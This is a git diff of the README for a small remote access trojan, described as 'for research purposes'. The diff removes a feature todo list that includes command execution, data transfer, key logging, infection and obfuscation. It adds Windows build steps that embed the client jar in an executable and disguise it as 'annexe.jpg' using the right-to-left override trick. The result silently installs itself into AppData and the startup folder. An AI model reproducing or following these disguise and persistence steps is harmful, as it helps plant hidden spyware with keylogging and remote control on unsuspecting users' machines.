@@ -2,25 +2,26 @@
 
 A small remote access trojan, for research purposes.
 
-## todo list
-
-1. DONE: communication
-    1. DONE: server host
-    2. DONE: request syntax
-2. DONE: features
-    1. DONE: command exec
-    2. DONE: data transfer
-    3. DONE: key logging
-3. infection
-    1. startup
-    2. copy on volumes
-4. sneak
-    1. obfuscation
-    2. encryption
-
 ## git usage
 
 Always use **branches** when implementing a *feature* or a *fix*, with syntax `feature/yourName/featureName` or `fix/yourName/bugToFix`, and be careful when merging.
+
+## [windows] build exe
+
+ 1. Compile `MainClient.java` as a runnable jar
+ 2. Compile `srat.au3` into an executable
+
+		aut2exe.exe /In srat.au3 /out ann.exe /icon img.ico
+
+ 3. Add the jar file as a resource into the executable, with data-type `RCDATA` and name `JAR`
+
+		reshacker.exe -add ann.exe ann.exe client.jar RCDATA JAR
+
+ 4. Rename file with RTLO method
+
+    	python rtlo.py ann.exe
+
+Then we end up with a file `annexe.jpg`, that, when executed, copies `client.jar` into current user AppData folder, and creates a `srat.bat` file in windows startup folder that silently starts the jar at startup.
 
 ## server usage
 
